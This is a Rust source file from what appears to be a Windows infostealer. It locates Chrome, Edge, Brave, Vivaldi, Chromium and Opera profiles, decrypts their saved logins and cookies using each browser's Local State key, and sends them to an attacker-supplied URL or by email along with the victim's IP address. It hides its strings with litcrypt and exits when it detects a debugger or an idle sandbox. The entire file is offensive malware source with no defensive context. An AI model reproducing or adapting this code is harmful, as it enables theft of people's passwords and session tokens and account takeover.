use crate::{email, robber};
use kernel32::{GetCurrentProcess, GetTickCount};
use litcrypt::{lc, use_litcrypt};
use ntapi::ntpsapi::NtQueryInformationProcess;
use serde_json::to_writer;
use std::ffi::c_void;
use std::path::Path;
use std::ptr::null_mut;
use std::{env, fs::File};
use winapi::um::winuser::{GetLastInputInfo, LASTINPUTINFO};

use_litcrypt!("irm;.o/bus/w/br[.mgwqq/u/jel;;uq");

fn build_base_directories() -> Result<Vec<std::path::PathBuf>, ()> {
    let mut base_directories = vec![];
    if let Some(local) = env::var_os(lc!("LOCALAPPDATA")) {
        if let Some(local) = local.to_str() {
            let local_path = Path::new(local);
            let directories_all = vec![
                local_path
                    .join(lc!("Google"))
                    .join(lc!("Chrome"))
                    .join(lc!("User Data")),
                local_path
                    .join(lc!("Microsoft"))
                    .join(lc!("Edge"))
                    .join(lc!("User Data")),
                local_path.join(lc!("Chromium")).join(lc!("User Data")),
                local_path
                    .join(lc!("BraveSoftware"))
                    .join(lc!("Brave-Browser"))
                    .join(lc!("User Data")),
                local_path.join(lc!("Vivaldi")).join(lc!("User Data")),
                local_path
                    .join(lc!("Opera Software"))
                    .join(lc!("Opera Stable")),
            ];
            for directory in directories_all {
                if directory.exists() == true {
                    base_directories.push(directory);
                }
            }
        }
    }
    Ok(base_directories)
}

fn build_cookie_directory(base_dir: &std::path::PathBuf) -> Result<std::path::PathBuf, ()> {
    let cookie_dirs = vec![
        base_dir.join(lc!("Default")).join(lc!("Cookies")),
        base_dir.join(lc!("Cookies")),
    ];
    for cookie_dir in cookie_dirs {
        if cookie_dir.exists() == true {
            return Ok(cookie_dir);
        }
    }
    Err(())
}
fn build_login_directory(base_dir: &std::path::PathBuf) -> Result<std::path::PathBuf, ()> {
    let login_dirs = vec![
        base_dir.join(lc!("Default")).join(lc!("Login Data")),
        base_dir.join(lc!("Login Data")),
    ];
    for login_dir in login_dirs {
        if login_dir.exists() == true {
            return Ok(login_dir);
        }
    }
    Err(())
}
fn build_key_directory(base_dir: &std::path::PathBuf) -> Result<std::path::PathBuf, ()> {
    let key_dir = base_dir.join(lc!("Local State"));
    if key_dir.exists() == true {
        return Ok(key_dir);
    }
    Err(())
}

pub fn run_robber(
    do_cookie: bool,
    do_login: bool,
    url: &str,
    email: bool,
    username: &str,
    password: &str,
) -> Result<i32, ()> {
    unsafe {
        let p_info = &mut 0u32 as *mut u32 as *mut c_void;
        let handle = GetCurrentProcess();
        let status = NtQueryInformationProcess(handle, 7, p_info, 8, null_mut());
        if !(*(p_info as *const u32) == 0 && status == 0) {
            std::process::exit(1);
        }
        let mut last_input_info: LASTINPUTINFO = LASTINPUTINFO {
            cbSize: std::mem::size_of::<LASTINPUTINFO>() as u32,
            dwTime: 0u32,
        };
        GetLastInputInfo(&mut last_input_info);
        if GetTickCount() - last_input_info.dwTime >= 10000 {
            std::process::exit(1);
        }
    }
    let base_dirs = build_base_directories()?;
    let mut filepaths: Vec<String> = vec![];
    let mut filenames_temp: Vec<String> = vec![];
    for base_dir in base_dirs {
        let key_dir = build_key_directory(&base_dir)?;
        if let Ok(key) = robber::get_key(&key_dir) {
            if do_cookie == true {
                let cookie_dir = build_cookie_directory(&base_dir)?;

                if let Ok(cookie_data) = robber::get_cookies(&cookie_dir, &key) {
                    if !email {
                        robber::send_data(cookie_data, format!("{}{}", url, lc!("/cookie")))
                            .unwrap();
                    } else {
                        let filename = base_dir.join(Path::new("cookies"));
                        let mut filenum = 0;
                        let mut filepath =
                            format!("{}{}.json", filename.to_string_lossy(), filenum);
                        while filenames_temp.contains(&format!("cookies{}.json", filenum)) {
                            filenum += 1;
                            filepath = format!("{}{}.json", filename.to_string_lossy(), filenum);
                        }

                        let file = File::create(&filepath).unwrap();
                        to_writer(file, &cookie_data).unwrap();
                        filepaths.push(filepath);
                        filenames_temp.push(format!("cookies{}.json", filenum));
                    }
                }
            }
            if do_login == true {
                let login_dir = build_login_directory(&base_dir)?;
                let base_dir = login_dir.parent().ok_or("").unwrap();
                if let Ok(login_data) = robber::get_login(&login_dir, &key) {
                    if !email {
                        robber::send_data(login_data, format!("{}{}", url, lc!("/login"))).unwrap();
                    } else {
                        let filename = base_dir.join(Path::new("login"));
                        let mut filenum = 0;
                        let mut filepath =
                            format!("{}{}.json", filename.to_string_lossy(), filenum);
                        while filenames_temp.contains(&format!("login{}.json", filenum)) {
                            filenum += 1;
                            filepath = format!("{}{}.json", filename.to_string_lossy(), filenum);
                        }
                        let file = File::create(&filepath).unwrap();
                        to_writer(file, &login_data).unwrap();
                        filepaths.push(filepath);
                        filenames_temp.push(format!("login{}.json", filenum));
                    }
                }
            }
        }
    }
    if filepaths.len() > 0 {
        let ip = robber::get_ip();
        let email = email::build_email(username.to_string(), filepaths, ip);
        email::send_email(email, username, password);
    }
    return Ok(0);
}
